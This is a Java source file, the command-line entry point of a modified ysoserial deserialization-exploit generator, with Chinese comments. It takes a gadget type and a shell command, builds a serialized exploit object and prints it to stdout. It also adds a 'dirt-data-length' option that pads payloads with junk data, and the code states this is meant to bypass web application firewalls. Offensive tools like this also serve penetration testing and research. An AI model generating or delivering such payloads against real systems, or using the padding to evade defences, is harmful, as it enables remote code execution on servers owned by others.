package ysoserial;

import java.io.PrintStream;
import java.util.*;

import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import org.apache.commons.cli.*;
import ysoserial.payloads.util.DirtyDataWrapper;

@SuppressWarnings("rawtypes")
public class GeneratePayload {
	private static final int INTERNAL_ERROR_CODE = 70;
	private static final int USAGE_CODE = 64;
    public static CommandLine cmdLine;

    public static void main(final String[] args) {
//		if (args.length != 2) {
//			printUsage();
//			System.exit(USAGE_CODE);
//		}
		final String payloadType = args[0];
		final String command = args[1];

		// 增加cli 参数解析
        Options options = new Options();
        options.addOption("ddl", "dirt-data-length",true,"Add the length of dirty data, used to bypass WAF");
        CommandLineParser parser = new DefaultParser();
        try {
            cmdLine = parser.parse(options, args);
        }catch (Exception e){
            System.out.println("[*] Parameter input error, please use -h for more information");
        }


        // 拿到要序列化的gadget类
		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
		if (payloadClass == null) {
			System.err.println("Invalid payload type '" + payloadType + "'");
			printUsage();
			System.exit(USAGE_CODE);
			return; // make null analysis happy
		}



		try {
		    // 对gadget类进行实例化，生成payload
			 ObjectPayload payload = payloadClass.newInstance();
			// 每个gadget的payload构造不同就看这个getObject了
			 Object object = payload.getObject(command);

            if(cmdLine.hasOption("dirt-data-length")){
                int dirtDataLength = Integer.valueOf(cmdLine.getOptionValue("dirt-data-length"));
                DirtyDataWrapper dirtyDataWrapper = new DirtyDataWrapper(object,dirtDataLength);
                object = dirtyDataWrapper.doWrap();
            }

			PrintStream out = System.out;
			// 对实例化的对象进行序列化
			Serializer.serialize(object, out);
			// 最后将payload打印出来
			ObjectPayload.Utils.releasePayload(payload, object);
		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			System.exit(INTERNAL_ERROR_CODE);
		}
		System.exit(0);
	}

	private static void printUsage() {
		System.err.println("Y SO SERIAL?");
		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'");
		System.err.println("  Available payload types:");

		final List<Class<? extends ObjectPayload>> payloadClasses =
			new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
		Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[] {"Payload", "Authors", "Dependencies"});
        rows.add(new String[] {"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
             rows.add(new String[] {
                payloadClass.getSimpleName(),
                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
}
